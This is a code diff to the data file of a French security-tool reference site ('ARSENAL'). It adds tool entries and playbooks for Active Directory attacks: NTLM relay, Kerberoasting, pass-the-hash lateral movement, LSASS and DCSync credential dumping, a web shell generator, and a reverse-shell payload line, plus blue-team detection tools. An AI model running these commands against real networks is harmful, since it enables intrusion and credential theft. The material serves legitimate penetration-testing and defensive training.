@@ -19,8 +19,8 @@
 
 const META = {
   name: "ARSENAL",
-  tagline: "Mémo exhaustif d'outils & méthodes — OSINT · Pentest · Red Team",
-  version: "1.0",
+  tagline: "Mémo exhaustif d'outils & méthodes — OSINT · Pentest · Red & Blue Team",
+  version: "1.1",
   repo: "https://github.com/" // ← remplace par l'URL de ton dépôt
 };
 
@@ -51,7 +51,10 @@ const CATEGORIES = [
   { id: "wireless",  icon: "📶", label: "Wi-Fi & sans-fil",            desc: "Audit des réseaux sans fil." },
   { id: "wordlists", icon: "📜", label: "Wordlists & payloads",        desc: "Dictionnaires et charges prêtes à l'emploi." },
   { id: "refs",      icon: "📚", label: "Références & LOLBINs",         desc: "Cheat-sheets vivantes : GTFOBins, LOLBAS…" },
-  { id: "method",    icon: "🧭", label: "Méthodologies & frameworks",   desc: "Cadres de test et référentiels." }
+  { id: "method",    icon: "🧭", label: "Méthodologies & frameworks",   desc: "Cadres de test et référentiels." },
+  { id: "forensic",  icon: "🔬", label: "Reverse & forensic",           desc: "Analyse de binaires, de mémoire et investigation numérique." },
+  { id: "blue",      icon: "🛡️", label: "Blue Team / SOC & détection",   desc: "Supervision, détection, CTI, SIEM et réponse à incident." },
+  { id: "train",     icon: "🎯", label: "Entraînement & labs",          desc: "Plateformes et environnements vulnérables pour s'exercer légalement." }
 ];
 
 /* ------------------------------------------------------------------- TOOLS */
@@ -387,7 +390,144 @@ const TOOLS = [
   { name: "Cyber Kill Chain", url: "https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html", cat: "method", platforms: ["web"], phases: ["support"],
     desc: "Modèle en 7 étapes décrivant le déroulé d'une intrusion (Lockheed Martin).", tags: "killchain modele intrusion etape" },
   { name: "AttackerKB", url: "https://attackerkb.com/", cat: "method", platforms: ["web"], phases: ["vuln"],
-    desc: "Retours d'expérience communautaires sur l'exploitabilité réelle des vulnérabilités.", tags: "vulnerabilite exploitabilite avis cve" }
+    desc: "Retours d'expérience communautaires sur l'exploitabilité réelle des vulnérabilités.", tags: "vulnerabilite exploitabilite avis cve" },
+
+  /* ===== OSINT (compléments) ===== */
+  { name: "ZoomEye", url: "https://www.zoomeye.org/", cat: "osint", platforms: ["web"], phases: ["recon"],
+    desc: "Moteur de recherche d'actifs exposés sur Internet (alternative à Shodan/Censys).", tags: "moteur exposition bannière iot" },
+  { name: "Netcraft", url: "https://www.netcraft.com/", cat: "osint", platforms: ["web"], phases: ["recon"],
+    desc: "Historique d'hébergement, technologies et infrastructure d'un site web.", tags: "hebergement techno historique site" },
+
+  /* ===== Active Directory (compléments) ===== */
+  { name: "ntlmrelayx (Impacket)", url: "https://github.com/fortra/impacket", cat: "ad", platforms: ["linux"], phases: ["exploit"], star: true,
+    desc: "Relaie une authentification NTLM capturée vers SMB/LDAP/MSSQL/HTTP pour exécuter des actions.", cmd: "impacket-ntlmrelayx -tf cibles.txt -smb2support",
+    tags: "ntlm relay responder smb ldap coercion secretsdump" },
+  { name: "mitm6", url: "https://github.com/dirkjanm/mitm6", cat: "ad", platforms: ["linux"], phases: ["exploit"],
+    desc: "Abuse de l'IPv6 par défaut (WPAD/DNS) pour un MITM ; se combine avec ntlmrelayx.", cmd: "mitm6 -d esdown.local", tags: "ipv6 wpad dns relay ntlm mitm" },
+  { name: "SharpHound", url: "https://github.com/SpecterOps/SharpHound", cat: "ad", platforms: ["windows"], phases: ["enum"],
+    desc: "Collecteur de données AD (sessions, ACL, groupes) qui alimente BloodHound.", cmd: "SharpHound.exe -c All", tags: "bloodhound collecteur ldap collector" },
+  { name: "lsassy", url: "https://github.com/Hackndo/lsassy", cat: "ad", platforms: ["linux"], phases: ["post"],
+    desc: "Dump à distance de LSASS et extraction des identifiants (s'intègre à NetExec).", cmd: "lsassy -d dom -u user -H <hash> <ip>", tags: "lsass dump credential distant comsvcs" },
+  { name: "PsExec (Sysinternals)", url: "https://learn.microsoft.com/sysinternals/downloads/psexec", cat: "ad", platforms: ["windows"], phases: ["post"],
+    desc: "Exécution de commandes à distance via SMB (upload d'un service) — natif, légitime.", cmd: "psexec.exe \\\\cible -s cmd", tags: "smb service distant laterale sysinternals system" },
+
+  /* ===== Post-exploitation (compléments) ===== */
+  { name: "LaZagne", url: "https://github.com/AlessandroZ/LaZagne", cat: "post", platforms: ["multi"], phases: ["post"], star: true,
+    desc: "Récupère les mots de passe stockés : navigateurs, mails, Wi-Fi, bases, Git, messageries.", cmd: "lazagne.exe all", tags: "credential mot-de-passe navigateur dump loot" },
+  { name: "mimipenguin", url: "https://github.com/huntergregal/mimipenguin", cat: "post", platforms: ["linux"], phases: ["post"],
+    desc: "Extrait les identifiants en clair de la mémoire d'un système Linux.", cmd: "./mimipenguin.sh", tags: "credential memoire linux mot-de-passe" },
+  { name: "PrintSpoofer", url: "https://github.com/itm4n/PrintSpoofer", cat: "post", platforms: ["windows"], phases: ["post"],
+    desc: "Élévation vers SYSTEM via SeImpersonatePrivilege (comptes de service).", cmd: "PrintSpoofer.exe -i -c cmd", tags: "privesc system seimpersonate potato service" },
+  { name: "Potato suite (JuicyPotato/GodPotato)", url: "https://github.com/BeichenDream/GodPotato", cat: "post", platforms: ["windows"], phases: ["post"],
+    desc: "Famille d'exploits abusant l'impersonation pour obtenir un jeton SYSTEM.", cmd: "GodPotato -cmd \"cmd /c whoami\"", tags: "privesc system potato juicy impersonation token" },
+  { name: "SharpUp", url: "https://github.com/GhostPack/SharpUp", cat: "post", platforms: ["windows"], phases: ["post"],
+    desc: "Portage C# de PowerUp : détection rapide de voies d'élévation Windows.", cmd: "SharpUp.exe audit", tags: "privesc windows powerup ghostpack service" },
+
+  /* ===== Web (compléments) ===== */
+  { name: "Wappalyzer", url: "https://www.wappalyzer.com/", cat: "web", platforms: ["web"], phases: ["enum"],
+    desc: "Identifie les technologies, frameworks et CMS d'un site (extension navigateur).", tags: "techno cms framework fingerprint" },
+  { name: "jwt_tool", url: "https://github.com/ticarpi/jwt_tool", cat: "web", platforms: ["linux"], phases: ["exploit"],
+    desc: "Analyse et attaque les JSON Web Tokens (alg=none, bruteforce de secret, forge).", cmd: "python3 jwt_tool.py <token>", tags: "jwt token authentification forge none" },
+  { name: "Dalfox", url: "https://github.com/hahwul/dalfox", cat: "web", platforms: ["multi"], phases: ["exploit"],
+    desc: "Scanner XSS rapide avec vérification des payloads réellement exécutés.", cmd: "dalfox url 'http://<ip>/?q=1'", tags: "xss scanner payload injection" },
+  { name: "Commix", url: "https://github.com/commixproject/commix", cat: "web", platforms: ["linux"], phases: ["exploit"],
+    desc: "Détection et exploitation automatisée des injections de commandes (OS command injection).", cmd: "commix -u 'http://<ip>/?p=1'", tags: "command injection rce web" },
+  { name: "BeEF", url: "https://github.com/beefproject/beef", cat: "web", platforms: ["linux"], phases: ["exploit"],
+    desc: "Framework d'exploitation du navigateur (hook XSS → contrôle du client).", tags: "xss navigateur hook client framework" },
+  { name: "Weevely", url: "https://github.com/epinna/weevely3", cat: "web", platforms: ["linux"], phases: ["post"],
+    desc: "Web shell PHP furtif et chiffré, avec de nombreux modules de post-exploitation.", cmd: "weevely generate <pass> shell.php", tags: "webshell php backdoor post" },
+  { name: "JoomScan", url: "https://github.com/OWASP/joomscan", cat: "web", platforms: ["linux"], phases: ["vuln"],
+    desc: "Scanner de vulnérabilités spécialisé Joomla (équivalent de WPScan).", cmd: "joomscan -u http://<ip>", tags: "joomla cms scanner" },
+  { name: "sslscan / testssl.sh", url: "https://github.com/drwetter/testssl.sh", cat: "web", platforms: ["linux"], phases: ["vuln"],
+    desc: "Audit de la configuration TLS/SSL (protocoles, ciphers, Heartbleed…).", cmd: "testssl.sh https://<ip>", tags: "tls ssl chiffrement cipher heartbleed" },
+
+  /* ===== Cracking (compléments) ===== */
+  { name: "CUPP", url: "https://github.com/Mebus/cupp", cat: "crack", platforms: ["linux"], phases: ["exploit"],
+    desc: "Génère un dictionnaire personnalisé à partir d'infos OSINT sur la cible (dates, noms, leet).", cmd: "cupp -i", tags: "wordlist profil osint personnalise" },
+
+  /* ===== Sniffing & MITM (compléments) ===== */
+  { name: "PCredz", url: "https://github.com/lgandx/PCredz", cat: "sniff", platforms: ["linux"], phases: ["enum"],
+    desc: "Extrait identifiants et hashes (NTLM, cartes, etc.) depuis un pcap ou le trafic live.", cmd: "PCredz -f capture.pcap", tags: "pcap credential ntlm extraction sniff" },
+  { name: "dsniff", url: "https://www.monkey.org/~dugsong/dsniff/", cat: "sniff", platforms: ["linux"], phases: ["exploit"],
+    desc: "Suite MITM historique (arpspoof, dnsspoof, sshmitm…) pour capturer le trafic.", tags: "mitm arpspoof dnsspoof capture reseau" },
+
+  /* ===== Exploitation (ICS/SCADA) ===== */
+  { name: "MBTGET", url: "https://github.com/sourceperl/mbtget", cat: "exploit", platforms: ["linux"], phases: ["exploit"],
+    desc: "Client Modbus TCP (port 502) pour lire/écrire coils et registres d'automates (ICS/SCADA).", cmd: "mbtget -r3 -a 0 -n 10 <ip>", tags: "ics scada modbus plc automate industriel" },
+
+  /* ===== Reverse & forensic ===== */
+  { name: "Ghidra", url: "https://ghidra-sre.org/", cat: "forensic", platforms: ["multi"], phases: ["support"], star: true,
+    desc: "Suite de rétro-ingénierie de la NSA : désassembleur et décompilateur multi-architectures.", tags: "reverse desassembleur decompilateur nsa binaire" },
+  { name: "radare2 / Rizin", url: "https://rizin.re/", cat: "forensic", platforms: ["multi"], phases: ["support"],
+    desc: "Framework d'analyse binaire en ligne de commande (désassemblage, debug, patch).", cmd: "r2 -A binaire", tags: "reverse binaire desassemblage debug cli" },
+  { name: "Cutter", url: "https://cutter.re/", cat: "forensic", platforms: ["multi"], phases: ["support"],
+    desc: "Interface graphique de reverse engineering bâtie sur Rizin.", tags: "reverse gui rizin binaire" },
+  { name: "Volatility 3", url: "https://github.com/volatilityfoundation/volatility3", cat: "forensic", platforms: ["multi"], phases: ["support"], star: true,
+    desc: "Analyse forensique de la mémoire vive (processus, connexions, injections, hashes).", cmd: "vol -f memoire.raw windows.pslist", tags: "memoire ram forensic dfir dump" },
+  { name: "Autopsy / Sleuth Kit", url: "https://www.autopsy.com/", cat: "forensic", platforms: ["multi"], phases: ["support"],
+    desc: "Plateforme d'investigation sur disques et systèmes de fichiers (DFIR).", tags: "disque forensic dfir fichier investigation" },
+  { name: "binwalk", url: "https://github.com/ReFirmLabs/binwalk", cat: "forensic", platforms: ["linux"], phases: ["support"],
+    desc: "Analyse et extraction de contenus embarqués dans un firmware ou un fichier binaire.", cmd: "binwalk -e firmware.bin", tags: "firmware extraction binaire embarque" },
+  { name: "Cuckoo Sandbox", url: "https://cuckoosandbox.org/", cat: "forensic", platforms: ["linux"], phases: ["support"],
+    desc: "Bac à sable automatisé d'analyse dynamique de malware.", tags: "malware sandbox analyse dynamique" },
+
+  /* ===== Blue Team / SOC & détection ===== */
+  { name: "Sysmon", url: "https://learn.microsoft.com/sysinternals/downloads/sysmon", cat: "blue", platforms: ["windows"], phases: ["support"], star: true,
+    desc: "Journalisation avancée Windows (création de process, réseau, DNS, injections) pour la détection.", cmd: "sysmon64 -accepteula -i config.xml", tags: "sysinternals log detection sysmon event telemetrie" },
+  { name: "Sysinternals Suite", url: "https://learn.microsoft.com/sysinternals/", cat: "blue", platforms: ["windows"], phases: ["support"],
+    desc: "Procmon, Process Explorer, Autoruns, ProcDump, TCPView… pour l'analyse système et l'IR.", tags: "sysinternals process autoruns procdump tcpview analyse" },
+  { name: "SIGMA (SigmaHQ)", url: "https://github.com/SigmaHQ/sigma", cat: "blue", platforms: ["multi"], phases: ["support"], star: true,
+    desc: "Format universel de règles de détection (YAML), convertible vers chaque SIEM. « Snort pour les logs ».", tags: "detection regle siem yaml mitre log" },
+  { name: "YARA", url: "https://github.com/VirusTotal/yara", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "Moteur de détection de malware par motifs (règles sur fichiers et mémoire).", cmd: "yara regle.yar fichier", tags: "malware detection pattern regle signature" },
+  { name: "Wazuh", url: "https://wazuh.com/", cat: "blue", platforms: ["multi"], phases: ["support"], star: true,
+    desc: "Plateforme XDR/SIEM open source : détection, intégrité, réponse auto (isolement).", tags: "xdr siem edr open source detection reponse" },
+  { name: "Elastic Stack (ELK)", url: "https://www.elastic.co/elastic-stack", cat: "blue", platforms: ["multi"], phases: ["support"], star: true,
+    desc: "Beats + Logstash + Elasticsearch + Kibana : collecte, indexation et visualisation des logs.", tags: "siem elk elastic kibana logstash beats log" },
+  { name: "Splunk", url: "https://www.splunk.com/", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "Plateforme d'analyse de données/SIEM de référence (SPL, MLTK, Phantom/SOAR).", cmd: "... | stats count by src_ip | where count > 10", tags: "siem splunk spl log correlation" },
+  { name: "Graylog", url: "https://graylog.org/", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "SIEM open source de centralisation et de corrélation de logs.", tags: "siem log open source correlation" },
+  { name: "Suricata", url: "https://suricata.io/", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "IDS/IPS réseau haute performance (inspection, règles, extraction de fichiers).", tags: "ids ips reseau nids detection regle" },
+  { name: "Zeek", url: "https://zeek.org/", cat: "blue", platforms: ["linux"], phases: ["support"],
+    desc: "Moniteur de sécurité réseau générant une télémétrie riche (ex-Bro).", tags: "nsm reseau monitoring telemetrie bro" },
+  { name: "Snort", url: "https://www.snort.org/", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "IDS/IPS réseau historique à base de signatures.", tags: "ids ips signature reseau detection" },
+  { name: "OpenCTI", url: "https://www.opencti.io/", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "Plateforme de Cyber Threat Intelligence (modèle STIX2, corrélation d'IoC/TTP).", tags: "cti threat intelligence stix ioc ttp" },
+  { name: "MISP", url: "https://www.misp-project.org/", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "Plateforme de partage et de corrélation d'indicateurs de compromission (IoC).", tags: "cti ioc partage threat intelligence" },
+  { name: "TheHive / Cortex", url: "https://strangebee.com/thehive/", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "Plateforme de réponse à incident (case management) et d'analyse d'observables.", tags: "ir incident soar case management observable" },
+  { name: "Velociraptor", url: "https://docs.velociraptor.app/", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "Chasse et collecte DFIR à grande échelle sur le parc (endpoint visibility).", tags: "dfir endpoint hunting collecte forensic" },
+  { name: "Atomic Red Team", url: "https://github.com/redcanaryco/atomic-red-team", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "Tests d'attaque atomiques mappés MITRE ATT&CK pour valider la détection (Purple Team).", tags: "purple mitre test detection simulation bas" },
+  { name: "CALDERA", url: "https://github.com/mitre/caldera", cat: "blue", platforms: ["multi"], phases: ["support"],
+    desc: "Simulation d'adversaire automatisée par agents (MITRE) — émulation de TTP.", tags: "mitre adversaire emulation bas purple agent" },
+  { name: "auditd", url: "https://github.com/linux-audit/audit-userspace", cat: "blue", platforms: ["linux"], phases: ["support"],
+    desc: "Démon d'audit Linux (appels système, accès fichiers) ; source de logs pour le SIEM.", cmd: "auditctl -l", tags: "linux audit log detection siem" },
+
+  /* ===== Entraînement & labs ===== */
+  { name: "Hack The Box", url: "https://www.hackthebox.com/", cat: "train", platforms: ["web"], phases: ["support"], star: true,
+    desc: "Machines et labs d'entraînement offensif (du débutant au réaliste), + Academy.", tags: "ctf lab machine entrainement htb academy" },
+  { name: "TryHackMe", url: "https://tryhackme.com/", cat: "train", platforms: ["web"], phases: ["support"], star: true,
+    desc: "Parcours guidés et salles thématiques, idéal pour apprendre pas à pas.", tags: "ctf lab apprentissage parcours room debutant" },
+  { name: "VulnHub", url: "https://www.vulnhub.com/", cat: "train", platforms: ["web"], phases: ["support"],
+    desc: "Catalogue de VM vulnérables à télécharger et exploiter en local.", tags: "vm vulnerable lab local boot2root" },
+  { name: "Root-Me", url: "https://www.root-me.org/", cat: "train", platforms: ["web"], phases: ["support"],
+    desc: "Plateforme française de challenges par catégories (web, crack, réseau, stégano…).", tags: "challenge francais web crack ctf" },
+  { name: "PortSwigger Web Security Academy", url: "https://portswigger.net/web-security", cat: "train", platforms: ["web"], phases: ["support"], star: true,
+    desc: "Labs gratuits de référence sur les vulnérabilités web (par les créateurs de Burp).", tags: "web labs owasp apprentissage burp gratuit" },
+  { name: "OWASP Juice Shop", url: "https://owasp.org/www-project-juice-shop/", cat: "train", platforms: ["multi"], phases: ["support"],
+    desc: "Application web volontairement vulnérable (OWASP Top 10) à auto-héberger.", tags: "owasp vulnerable web lab entrainement" },
+  { name: "DVWA", url: "https://github.com/digininja/DVWA", cat: "train", platforms: ["multi"], phases: ["support"],
+    desc: "Damn Vulnerable Web Application : terrain d'entraînement web classique (niveaux de difficulté).", tags: "vulnerable web php lab entrainement" },
+  { name: "WebGoat", url: "https://owasp.org/www-project-webgoat/", cat: "train", platforms: ["multi"], phases: ["support"],
+    desc: "Application d'apprentissage OWASP avec leçons guidées.", tags: "owasp vulnerable web lecon apprentissage" },
+  { name: "PentesterLab", url: "https://pentesterlab.com/", cat: "train", platforms: ["web"], phases: ["support"],
+    desc: "Exercices ciblés sur des vulnérabilités précises, avec explications.", tags: "web exercice vulnerabilite apprentissage" }
 ];
 
 /* ------------------------------------------------- CHEATS (cas d'usage) ---
@@ -537,7 +677,64 @@ const CHEATS = [
       { tool: "msfvenom", cmd: "msfvenom -p <payload> LHOST=<ip> LPORT=4444 -f <fmt>" },
       { tool: "socat", cmd: "Stabiliser en TTY complet une fois le shell obtenu" }
     ],
-    note: "Reverse shell > bind shell face à un pare-feu (c'est la victime qui sort). Stabiliser ensuite le TTY (python pty, socat, rlwrap)." }
+    note: "Reverse shell > bind shell face à un pare-feu (c'est la victime qui sort). Stabiliser ensuite le TTY (python pty, socat, rlwrap)." },
+
+  { icon: "🎣", title: "Je suis sur le réseau AD sans identifiant (poisoning)",
+    phase: "exploit",
+    steps: [
+      { tool: "Responder", cmd: "responder -I eth0   # capturer des hashs Net-NTLM (LLMNR/NBT-NS)" },
+      { tool: "ntlmrelayx (Impacket)", cmd: "impacket-ntlmrelayx -tf cibles.txt -smb2support   # relayer si pas de signature SMB" },
+      { tool: "mitm6", cmd: "mitm6 -d domaine.local   # takeover IPv6/WPAD, à coupler au relay" },
+      { tool: "Hashcat", cmd: "hashcat -m 5600 netntlm.hash rockyou.txt   # casser du NetNTLMv2" }
+    ],
+    note: "Si la signature SMB est absente (hors DC) → relay direct ; sinon, capture puis cassage offline du Net-NTLMv2." },
+
+  { icon: "🎟️", title: "Kerberos : énumérer et « roaster » des comptes",
+    phase: "exploit",
+    steps: [
+      { tool: "Kerbrute", cmd: "kerbrute userenum -d dom.local --dc <ip> users.txt" },
+      { tool: "Impacket", cmd: "impacket-GetNPUsers dom.local/ -usersfile u.txt -no-pass -format hashcat   # AS-REP roast" },
+      { tool: "Impacket", cmd: "impacket-GetUserSPNs -request dom.local/user   # Kerberoast (comptes à SPN)" },
+      { tool: "Hashcat", cmd: "hashcat -m 18200 asrep.hash wl   # AS-REP   |   -m 13100 tgs.hash wl   # Kerberoast" }
+    ],
+    note: "AS-REP = comptes sans pré-auth Kerberos ; Kerberoast = comptes utilisateurs portant un SPN avec mot de passe faible." },
+
+  { icon: "🗺️", title: "J'ai un compte de domaine, je cherche le chemin vers Domain Admin",
+    phase: "post",
+    steps: [
+      { tool: "BloodHound", cmd: "bloodhound-python -d dom.local -u user -p pass -c all" },
+      { tool: "SharpHound", cmd: "SharpHound.exe -c All   # depuis une machine Windows du domaine" },
+      { tool: "BloodHound", cmd: "Requête : « Shortest Path to Domain Admins »" }
+    ],
+    note: "Repère aussi les comptes kerberoastables, les sessions d'admins et les délégations exploitables (ACL, GPO)." },
+
+  { icon: "↔️", title: "Mouvement latéral Windows (j'ai un hash ou un compte)",
+    phase: "post",
+    steps: [
+      { tool: "NetExec (ex-CrackMapExec)", cmd: "nxc smb <net> -u user -H <hash> --local-auth   # trouver où on est admin" },
+      { tool: "Impacket", cmd: "impacket-psexec / wmiexec / smbexec dom/user@<ip> -hashes :<hash>" },
+      { tool: "evil-winrm", cmd: "evil-winrm -i <ip> -u user -H <hash>   # si WinRM (5985)" },
+      { tool: "lsassy", cmd: "récolter de nouveaux identifiants sur chaque machine atteinte" }
+    ],
+    note: "Réutilise hash NT (Pass-the-Hash) ou tickets (Pass-the-Ticket). Le mot de passe admin local est souvent identique sur tout le parc." },
+
+  { icon: "👑", title: "Je suis Domain Admin : dump et persistance",
+    phase: "post",
+    steps: [
+      { tool: "Impacket", cmd: "impacket-secretsdump -just-dc-ntlm dom/administrateur@<dc>   # DCSync / NTDS" },
+      { tool: "Mimikatz", cmd: "lsadump::dcsync /user:krbtgt   # hash krbtgt = clé du domaine" },
+      { tool: "Hashcat", cmd: "hashcat -m 1000 ntds.hash rockyou.txt --username   # casser les hashs NTLM" }
+    ],
+    note: "Le hash krbtgt permet un Golden Ticket (persistance totale). À manier avec prudence et à documenter dans le rapport." },
+
+  { icon: "🛡️", title: "Côté défense : détecter ces attaques (Blue Team)",
+    steps: [
+      { tool: "Sysmon", cmd: "Journaliser process/réseau/DNS (config SwiftOnSecurity)" },
+      { tool: "SIGMA (SigmaHQ)", cmd: "Déployer des règles mappées MITRE ATT&CK dans le SIEM" },
+      { tool: "Elastic Stack (ELK)", cmd: "Event 4769/4768 (Kerberoast/Golden), 4662 (DCSync), 4624 type 3" },
+      { tool: "Atomic Red Team", cmd: "Rejouer les TTP pour valider la couverture de détection" }
+    ],
+    note: "Correspondance offensif ↔ défensif : chaque technique (roasting, DCSync, PTH) laisse des traces dans les Event IDs Windows." }
 ];
 
 /* Expose global (compat file:// et GitHub Pages) */
